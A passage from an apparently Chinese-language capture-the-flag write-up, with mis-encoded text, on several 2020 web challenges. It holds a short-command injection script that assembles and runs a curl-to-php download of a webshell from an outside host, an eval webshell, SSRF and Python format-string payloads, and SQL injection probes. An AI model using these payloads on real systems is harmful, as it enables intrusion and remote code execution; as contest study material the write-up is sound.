class="string">'g'</span>  <span class="comment"># éšæ„é€‰æ‹©å­—ç¬¦</span></span><br><span class="line"> </span><br><span class="line">payload = [</span><br><span class="line">    <span class="string">'&gt;dir'</span>,</span><br><span class="line">    <span class="comment"># åˆ›å»ºåä¸º dir çš„æ–‡ä»¶</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">'&gt;f\\&gt;'</span>, <span class="comment">#% pos0,</span></span><br><span class="line">    <span class="comment"># å‡è®¾pos0é€‰æ‹© f , åˆ›å»ºåä¸º f&gt; çš„æ–‡ä»¶</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">'&gt;%st-'</span> % pos1,</span><br><span class="line">    <span class="comment"># å‡è®¾pos1é€‰æ‹© k , åˆ›å»ºåä¸º kt- çš„æ–‡ä»¶,å¿…é¡»åŠ ä¸ªpos1ï¼Œ</span></span><br><span class="line">    <span class="comment"># å› ä¸ºalphabeticalåºä¸­t&gt;s</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">'&gt;sl'</span>,</span><br><span class="line">    <span class="comment"># åˆ›å»ºåä¸º &gt;sl çš„æ–‡ä»¶ï¼›åˆ°æ­¤å¤„æœ‰å››ä¸ªæ–‡ä»¶ï¼Œ</span></span><br><span class="line">    <span class="comment"># ls çš„ç»“æœä¼šæ˜¯ï¼šdir f&gt; kt- sl</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">'*&gt;v'</span>,</span><br><span class="line">    <span class="comment"># å‰æ–‡æåˆ°ï¼Œ * ç›¸å½“äº `ls` ï¼Œé‚£ä¹ˆè¿™æ¡å‘½ä»¤ç­‰ä»·äº `dir f&gt; kt- sl`&gt;v ï¼Œ</span></span><br><span class="line">    <span class="comment">#  å‰é¢æåˆ°diræ˜¯ä¸æ¢è¡Œçš„ï¼Œæ‰€ä»¥è¿™æ—¶ä¼šåˆ›å»ºæ–‡ä»¶ v å¹¶å†™å…¥ f&gt; kt- sl</span></span><br><span class="line">    <span class="comment"># éå¸¸å¥‡å¦™ï¼Œè¿™é‡Œçš„æ–‡ä»¶åæ˜¯ v ï¼Œåªèƒ½æ˜¯v ï¼Œæ²¡æœ‰å¯é€‰å­—ç¬¦</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">'&gt;rev'</span>,</span><br><span class="line">    <span class="comment"># åˆ›å»ºåä¸º rev çš„æ–‡ä»¶ï¼Œè¿™æ—¶å½“å‰ç›®å½•ä¸‹ ls çš„ç»“æœæ˜¯ï¼š dir f&gt; kt- rev sl v</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">'*v&gt;%s'</span> % pos2,</span><br><span class="line">    <span class="comment"># é­”æ³•å‘ç”Ÿåœ¨è¿™é‡Œï¼š *v ç›¸å½“äº rev v ï¼Œ* çœ‹ä½œé€šé…ç¬¦ã€‚å‰æ–‡ä¹Ÿæè¿‡äº†ï¼Œä½“ä¼šä¸€ä¸‹ã€‚</span></span><br><span class="line">    <span class="comment"># è¿™æ—¶pos2æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ g æ–‡ä»¶å†…å®¹æ˜¯æ–‡ä»¶vå†…å®¹çš„åè½¬ï¼š ls -tk &gt; f</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># ç»­è¡Œåˆ†å‰² curl 0x11223344|php å¹¶é€†åºå†™å…¥</span></span><br><span class="line">    <span class="string">'&gt;p'</span>,</span><br><span class="line">    <span class="string">'&gt;ph\\'</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="string">'&gt;1.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\\&gt;\\'</span>,</span><br><span class="line">    <span class="comment">#'&gt;%s\\' % ip[8:10],</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#'&gt;%s\\' % ip[6:8],</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#'&gt;%s\\' % ip[4:6],</span></span><br><span class="line">    <span class="comment">#'&gt;%s\\' % ip[2:4],</span></span><br><span class="line">    <span class="comment">#'&gt;%s\\' % ip[0:2],</span></span><br><span class="line">    <span class="comment">#'&gt;77\\',</span></span><br><span class="line">    <span class="comment">#'&gt;88\\',</span></span><br><span class="line">    <span class="comment">#'&gt;:\\',</span></span><br><span class="line">    <span class="string">'&gt;xx\\'</span>,</span><br><span class="line">    <span class="string">'&gt;x.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;x\\'</span>,</span><br><span class="line">    <span class="string">'&gt;xx\\'</span>,</span><br><span class="line">    <span class="string">'&gt;xx\\'</span>,</span><br><span class="line">    <span class="string">'&gt;xx\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\ \\'</span>,</span><br><span class="line">    <span class="string">'&gt;rl\\'</span>,</span><br><span class="line">    <span class="string">'&gt;cu\\'</span>,</span><br><span class="line"> </span><br><span class="line">    <span class="string">'sh\x3c'</span> + pos2,</span><br><span class="line">    <span class="comment"># sh g ;g çš„å†…å®¹æ˜¯ ls -tk &gt; f ï¼Œé‚£ä¹ˆå°±ä¼šæŠŠé€†åºçš„å‘½ä»¤åè½¬å›æ¥ï¼Œ</span></span><br><span class="line">    <span class="comment"># è™½ç„¶ f çš„æ–‡ä»¶å¤´éƒ¨ä¼šæœ‰æ‚è´¨ï¼Œä½†ä¸å½±å“æœ‰æ•ˆå‘½ä»¤çš„æ‰§è¡Œ</span></span><br><span class="line">    <span class="string">'sh\x3c'</span> + <span class="string">'f'</span>,</span><br><span class="line">    <span class="comment"># sh f æ‰§è¡Œcurlå‘½ä»¤ï¼Œä¸‹è½½æ–‡ä»¶ï¼Œå†™å…¥æœ¨é©¬ã€‚</span></span><br><span class="line">]</span><br><span class="line">payload1=<span class="string">"compress.zlib://data:@127.0.0.1/plain;base64,&#123;0&#125;"</span></span><br><span class="line">cookie=&#123;<span class="string">"PHPSESSID"</span>:<span class="string">"38240b1ae7b72a9837ce059cd0640347"</span>&#125;</span><br><span class="line">s = r.get(reset)</span><br><span class="line"><span class="keyword">print</span> s.text</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> len(i) &lt;= <span class="number">4</span></span><br><span class="line">    data=&#123;<span class="string">"url"</span>:payload1.format(base64.b64encode(i))&#125;</span><br><span class="line">    s = r.post(target+<span class="string">"core/index.php"</span>,data=data,cookies=cookie)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[%d]'</span> % s.status_code, payload1.format(i)</span><br><span class="line">    <span class="keyword">print</span> s.text</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="comment">#s = r.get(sandbox + 'fun.php?cmd=uname -a')</span></span><br><span class="line"><span class="comment">#print '[%d]' % s.status_code, s.url</span></span><br><span class="line"><span class="comment">#print s.text</span></span><br></pre></td></tr></table></figure>

<p><a href="https://www.anquanke.com/post/id/87203" target="_blank" rel="noopener">å‚è€ƒ</a></p>
<p>è¿™é‡Œå¼€å§‹å°è¯•äº†åŠå¤©ï¼Œæ²¡æœ‰æˆåŠŸï¼Œ1.phpä¸­å†™ä¸è¿›å»ä¸œè¥¿ï¼Œå¼€å§‹æ˜¯ç”¨${IFS}ç»•è¿‡çš„ç©ºæ ¼ï¼Œå¯èƒ½ï¼Œç›®æ ‡æœåŠ¡å™¨ä¸æ”¯æŒå§ï¼Œæˆ–è€…å…¶ä»–åœ°æ–¹å§¿åŠ¿ä¸å¯¹å§ï¼Œåæ¥çœ‹é˜Ÿå‹çš„è„šæœ¬ç›´æ¥ç”¨base64ç¼–ç ä¼ å°±okäº†ï¼Œç„¶ååœ¨vpsä¸Šæ”¾å¥½é©¬ï¼Œä¸‹è½½è¿è¡Œ</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309151829834.png" alt="image-20200309151829834"></p>
<h1 id="dooog"><a href="#dooog" class="headerlink" title="dooog"></a>dooog</h1><p>é¢˜ç›®ç»™äº†æºç ï¼Œä¸‰ä¸ªå¤´çš„ç‹—ï¼Œä¸€çœ‹æºç ç¡®å®æ˜¯ä¸‰ä¸ªå¤´ï¼Œå¼€äº†ä¸‰ä¸ªæœåŠ¡ï¼Œå¯ä»¥æ‰§è¡Œwhoamiå’Œlså‘½ä»¤ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œç„¶åå®¡è®¡æºç ï¼Œè¿‡æ»¤å‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹åœ¨kdc/app.py</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309162853834.png" alt="image-20200309162853834"></p>
<p>è¿™é‡Œæ˜¾ç¤ºåˆ¤æ–­int(time.time())-data[â€˜timetampâ€™]&lt;60æ‰è¿›è¡Œå¯¹cmdçš„æ£€æŸ¥ï¼Œå¦‚æœè¿™é‡Œå¯ä»¥ä½¿int(time.time())-data[â€˜timetampâ€™]&gt;60çš„è¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç»•è¿‡æ£€æŸ¥æ‰§è¡Œå…¶ä»–å‘½ä»¤äº†ã€‚</p>
<p>æˆ‘ä»¬åœ¨æœ¬åœ°è¯•ä¸‹int(time.time())æ‰§è¡Œæƒ…å†µ</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309163211695.png" alt="image-20200309163211695"></p>
<p>ç„¶åå›æº¯çœ‹data[â€˜timetampâ€™]å˜é‡ï¼Œå®ƒæ¥è‡ªpostä¼ æ¥çš„authenticatorï¼Œç»§ç»­å¾€å‰çœ‹</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309163440276.png" alt="image-20200309163440276"></p>
<p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹timestampå°±å¯ä»¥å¾—åˆ°flagäº†ï¼Œç„¶åä¿®æ”¹app.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, redirect, url_for, session, flash</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">from</span> form <span class="keyword">import</span> RegisterForm, CmdForm</span><br><span class="line"><span class="keyword">from</span> toolkit <span class="keyword">import</span> AESCipher</span><br><span class="line"><span class="keyword">import</span> os, requests, json, time, base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">"SECRET_KEY"</span>] = os.urandom(<span class="number">32</span>)</span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/cmd', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">()</span>:</span></span><br><span class="line">    form = CmdForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">            username = form.username.data</span><br><span class="line">            master_key = form.master_key.data</span><br><span class="line">            cmd = form.cmd.data</span><br><span class="line">            cryptor = AESCipher(master_key)</span><br><span class="line">            authenticator = cryptor.encrypt(json.dumps(&#123;<span class="string">'username'</span>:username, <span class="string">'timestamp'</span>: int(time.time())&#125;))</span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5001/getTGT'</span>, data=&#123;<span class="string">'username'</span>: username, <span class="string">'authenticator'</span>: base64.b64encode(authenticator)&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'time error'</span>:</span><br><span class="line">                flash(<span class="string">'time error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            <span class="keyword">if</span> res.content.startswith(<span class="string">'auth'</span>):</span><br><span class="line">                flash(<span class="string">'auth error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            session[<span class="string">'session_key'</span>], session[<span class="string">'TGT'</span>] = cryptor.decrypt(base64.b64decode(res.content.split(<span class="string">'|'</span>)[<span class="number">0</span>])), res.content.split(<span class="string">'|'</span>)[<span class="number">1</span>]</span><br><span class="line">            flash(<span class="string">'GET TGT DONE'</span>)</span><br><span class="line">            <span class="comment">#visit TGS</span></span><br><span class="line">            cryptor = AESCipher(session[<span class="string">'session_key'</span>])</span><br><span class="line">            authenticator = cryptor.encrypt(json.dumps(&#123;<span class="string">'username'</span>: username, <span class="string">'timestamp'</span>: <span class="number">666</span>&#125;))</span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5001/getTicket'</span>,  data=&#123;<span class="string">'username'</span>: username, <span class="string">'cmd'</span>: cmd, <span class="string">'authenticator'</span>: base64.b64encode(authenticator), <span class="string">'TGT'</span>: session[<span class="string">'TGT'</span>]&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'time error'</span>:</span><br><span class="line">                flash(<span class="string">'time error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            <span class="keyword">if</span> res.content.startswith(<span class="string">'auth'</span>):</span><br><span class="line">                flash(<span class="string">'auth error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'cmd error'</span>:</span><br><span class="line">                flash(<span class="string">'cmd not allow'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            flash(<span class="string">'GET Ticket DONE'</span>)</span><br><span class="line">            client_message, server_message = res.content.split(<span class="string">'|'</span>)</span><br><span class="line">            session_key = cryptor.decrypt(base64.b64decode(client_message))</span><br><span class="line">            cryptor = AESCipher(session_key)</span><br><span class="line">            authenticator = base64.b64encode(cryptor.encrypt(username))</span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5002/cmd'</span>, data=&#123;<span class="string">'server_message'</span>: server_message, <span class="string">'authenticator'</span>: authenticator&#125;)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=<span class="string">''</span>, flag=res.content)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'error'</span> , <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/register', methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">            username = form.username.data</span><br><span class="line">            master_key = form.master_key.data</span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5001/register'</span>, data=&#123;<span class="string">'username'</span>: username, <span class="string">'master_key'</span>: master_key&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'duplicate username'</span>:</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'register'</span>))</span><br><span class="line">            <span class="keyword">elif</span> res.content != <span class="string">''</span> :</span><br><span class="line">                session[<span class="string">'id'</span>] = int(res.content)</span><br><span class="line">                flash(<span class="string">'register success'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'error'</span> , <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, debug=<span class="literal">False</span>, port = <span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309164217294.png" alt="image-20200309164217294"></p>
<h1 id="fmkq"><a href="#fmkq" class="headerlink" title="fmkq"></a>fmkq</h1><p>ç›´æ¥ç»™äº†æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'head'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $begin = <span class="string">"The number you want: "</span>;</span><br><span class="line">    extract($_GET);</span><br><span class="line">    <span class="keyword">if</span>($head == <span class="string">''</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Where is your head?'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/[A-Za-z0-9]/i'</span>,$head))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Head can\'t be like this!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/log/i'</span>,$url))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'No No No'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:/i'</span>,$url))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Don\'t use strangerotocol!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $funcname = $head.<span class="string">'curl_init'</span>;</span><br><span class="line"></span><br><span class="line">    $ch = $funcname();</span><br><span class="line">    <span class="keyword">if</span>($ch)&#123;</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $output = <span class="string">'rua'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> sprintf($begin.<span class="string">'%d'</span>,$output);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¼šæŠŠ$headå’Œcurl_initæ‹¼æ¥åˆ°$filename,å¦‚æœæœ‰éæ³•å­—ç¬¦ï¼ŒæœåŠ¡å™¨ä¼š500ï¼Œç„¶åfuzzå‡º\å¯ä»¥ç»•è¿‡</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309165446550.png" alt="image-20200309165446550">)ç„¶åç»“åˆextract()å’Œsprintf()å¯ä»¥å°†æˆ‘ä»¬curlåˆ°çš„outputæ•°æ®æ˜¾ç¤ºå‡ºæ¥ï¼Œå½¢å¦‚</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309174422589.png" alt="image-20200309174422589"></p>
<p>ç„¶åæ¢æµ‹å†…ç½‘å¼€çš„ç«¯å£ï¼Œ</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309174334659.png" alt="image-20200309174334659"></p>
<p>å‘ç°8080ç«¯å£å¼€äº†æœåŠ¡ï¼Œè¿™é¢˜å¤ç°æ—¶ç¯å¢ƒå…³äº†ï¼Œè€ƒç‚¹æ˜¯pythonçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è´´ä¸€ä¸‹payloadå§ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;121.37.179.47:1101&#x2F;?head&#x3D;\&amp;begin&#x3D;%1$s&amp;url&#x3D;http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;read&#x2F;file&#x3D;&#123;file.__init__.__globals__[vip].__init__.__globals__&#125;%26vipcode&#x3D;0</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;121.37.179.47:1101&#x2F;?head&#x3D;\&amp;begin&#x3D;%1$s&amp;url&#x3D;http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;read&#x2F;file&#x3D;&#123;vipfile.__class__.__init__.__globals__[__name__][9]&#125;l4g_1s_h3re_u_wi11_rua&#x2F;flag%26vipcode&#x3D;kWSRgrZO9VjAJzaHsIwqXEtfF5u6GxM0ov74le18hcNnUpd3</span><br></pre></td></tr></table></figure>



<h1 id="PHP-UAF"><a href="#PHP-UAF" class="headerlink" title="PHP-UAF"></a>PHP-UAF</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$sandbox = <span class="string">'/var/www/html/sandbox/'</span> . md5(<span class="string">"wdwd"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span><br><span class="line">    @<span class="keyword">eval</span>($_REQUEST[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥cmd=1;eval($_POST[â€˜cmdâ€™]);</p>
<p>èšå‰‘è¿ä¸Šï¼Œç›´æ¥è¯»flagã€‚è¿™é¢˜å¾ˆè¿·ï¼Œæœ‰æ—¶å¯ä»¥æœ‰æ—¶ä¸å¯ä»¥</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309183007889.png" alt="image-20200309183007889"></p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309182916595.png" alt="image-20200309182916595"></p>
<h1 id="easy-trick-gzmtu"><a href="#easy-trick-gzmtu" class="headerlink" title="easy_trick_gzmtu"></a>easy_trick_gzmtu</h1><p>è¿™é¢˜çœŸçš„æ˜¯ç¥äº†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p>
<p>è¿™é¢˜æç¤ºäº†time=2020,ç„¶åå¼€å§‹æµ‹æ³¨å…¥ï¼Œ</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200310081344799.png" alt="image-20200310081344799"></p>
<p>æ³¨å…¥ä¹‹åå¾ˆå¥‡æ€ªæ„Ÿè§‰æœ‰äº›å­—æ¯è¢«æ›¿æ¢æˆäº†æ•°å­—ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?time&#x3D;202&#39;%20||%20t%23</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡ä»¥ä¸Šå¯ä»¥å¾—åˆ°ï¼Œä¸æ˜¯æ›¿æ¢ä¸ºç©ºï¼Œç„¶åburpå¼€å§‹fuzz</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å¤§å†™  BGHILNOUWYZ</span><br><span class="line">å°å†™  dghijmnostuwyz</span><br></pre></td></tr></table></figure>

<p>è¿™äº›å­—ç¬¦ä¼šè¢«æ›¿æ¢ä¸ºæ•°å­—ï¼Œå¼€å§‹ä»¥ä¸ºåªè¦ä¸ç”¨è¿™é‡Œçš„å­—ç¬¦å°±ä¸ä¼šè¢«æ›¿æ¢ï¼Œç„¶åç”¨äº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?time&#x3D;202&#39;%20||%20lefT(&#39;22&#39;,1)&#x3D;&#39;2&#39;%23</span><br></pre></td></tr></table></figure>

<p>è¿˜æ˜¯ä¼š500ï¼Œé‚£ä¹ˆå°±ä¸å…‰æ˜¯ä¹‹å‰çš„é‚£äº›å­—ç¬¦ä¼šè¢«æ›¿æ¢äº†ï¼ŒçŒœæµ‹æ‰€æœ‰çš„å­—ç¬¦éƒ½è¢«æ›¿æ¢äº†ï¼Œæ¯”èµ›æ—¶å€™å°±å¡åœ¨è¿™äº†ï¼Œç„¶ååˆè¯•äº†åŠå¤©åè®®èµ°ç§ï¼Œæ²¡åšå‡ºæ¥ï¼Œåæ¥çœ‹äº†wpåï¼ŒåŸæ¥å¦‚æ­¤ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p>
<p>èµ›ååˆ†æï¼šåº”è¯¥æ²¡æœ‰wafä¼šæŠŠæ¯ä¸ªå­—ç¬¦éƒ½æ›¿æ¢æ‰ï¼Œç„¶åè¿™é‡Œæ³¨é‡Šé‡Œå†™é“time=Yï¼Œé‚£ä¹ˆåç«¯å¯èƒ½ä¼šç”¨å¤„ç†æ—¶é—´æ—¥æœŸçš„æ ¼å¼æˆ–å‡½æ•°æ¥å¤„ç†æˆ‘ä»¬çš„è¾“å…¥ï¼Œç„¶åå°±åº”è¯¥å»æŸ¥æŸ¥mysqlå’Œphpçš„æ—¥æœŸå¤„ç†å‡½æ•°ï¼Œç„¶åçœ‹åˆ°phpçš„date()å‡½æ•°,</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200310082313115.png" alt="image-20200310082313115"></p>
<p>å’Œä¹‹å‰çš„ä¸€æ¯”å¯¹ç¡®å®æ˜¯æŠŠé‚£äº›å­—ç¬¦æ›¿æ¢æˆäº†æ•°å­—ï¼Œç„¶åç»§ç»­çœ‹è¿™ä¸ªå‡½æ•°ï¼Œ</p>
